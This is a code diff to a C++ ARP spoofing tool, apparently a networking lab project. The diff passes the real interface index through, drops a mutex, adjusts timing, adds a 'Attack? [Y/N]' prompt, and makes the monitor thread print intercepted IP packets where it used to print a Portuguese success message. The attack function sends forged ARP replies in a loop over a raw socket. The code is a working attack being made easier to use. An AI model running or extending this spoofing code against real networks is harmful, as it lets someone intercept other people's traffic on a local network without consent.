@@ -15,7 +15,6 @@
 #include <cstring>
 #include <iostream>
 #include <iomanip>
-#include <mutex>
 #include <thread>
 
 #include "colors.h"
@@ -28,10 +27,9 @@ using namespace Colors;
 
 void SIGINTHandler(int);
 
-std::mutex runMutex;
 int run = 1;
 
-void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
+void attack(int socket, int ifindex, BYTE* intMac, const Arp& arp)
 {
   Arp reply = arp;
   reply.operation = 2;
@@ -66,7 +64,7 @@ void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
   destAddr.sll_family = htons(PF_PACKET);
   destAddr.sll_protocol = htons(ETH_P_ALL);
   destAddr.sll_halen = HLEN;
-  destAddr.sll_ifindex = 3;
+  destAddr.sll_ifindex = ifindex;
   memcpy(&(destAddr.sll_addr), ethernet.destination, HLEN);
 
   std::cout << green << "Engaging attack!" << std::endl;
@@ -74,15 +72,13 @@ void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
   int count = 0;
   while (run)
   {
-    runMutex.lock();
     int ret;
     if ((ret = sendto(socket, buff, size, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
 			error();
 			return;
     }
     count++;
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    runMutex.unlock();
+    std::this_thread::sleep_for(std::chrono::milliseconds(150));
   }
 
   std::cout << "Finish attacking thread (" << (int)count << " packets sent)...";
@@ -91,11 +87,9 @@ void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
 
 void monitor(int socket, const Arp& arp)
 {
-	BYTE buff[BUFFSIZE];
+  BYTE buff[BUFFSIZE];
   while (run)
   {
-    runMutex.lock();
-
     recv(socket, (char *) &buff, sizeof(buff), 0x00);
     Ethernet ethernet(&buff[0]);
 
@@ -104,11 +98,10 @@ void monitor(int socket, const Arp& arp)
       Ip ip(&buff[14]);
       if (CompareIP(arp.targetPAddr, ip.targetAddr))
       {
-        std::cout << std::endl << "ATAQUE FOI UM SUCESSO!" << std::endl;
+          std::cout << std::endl << ip.ToString() << std::endl;
       }
     }
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    runMutex.unlock();
+    std::this_thread::sleep_for(std::chrono::milliseconds(50));
   }
 }
 
@@ -156,6 +149,8 @@ int main(int argc, char** argv)
     close(sockd);
     exit(-1);
   }
+
+  int ifindex = ifr.ifr_ifindex;
 
   ok();
   std::cout << "Retrieve interface hardware address...";
@@ -223,9 +218,19 @@ int main(int argc, char** argv)
       {
         std::cout << std::endl << arp.ToString() << std::endl;
 
-        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, intMac, arp);
-        monitorThread = new std::thread(monitor, sockd, arp);
-        break;
+	char ch = '\0';
+	while (ch != 'y' && ch != 'Y' && ch != 'n' && ch != 'N')
+        {
+	  std::cout << "Attack? [Y/N] ";
+          std::cin >> ch;
+        }
+
+	if (ch == 'y' || ch == 'Y')
+	{
+          attackThread = new std::thread(attack, sockd, ifindex, intMac, arp);
+          monitorThread = new std::thread(monitor, sockd, arp);
+          break;
+	}
       }
     }
 	}
@@ -255,8 +260,6 @@ int main(int argc, char** argv)
 void SIGINTHandler(int sig)
 {
   std::cout << yellow << "Received signal to interrupt execution. Terminating...\n\n" << reset;
-  runMutex.lock();
   run = 0;
-  runMutex.unlock();
 }
 
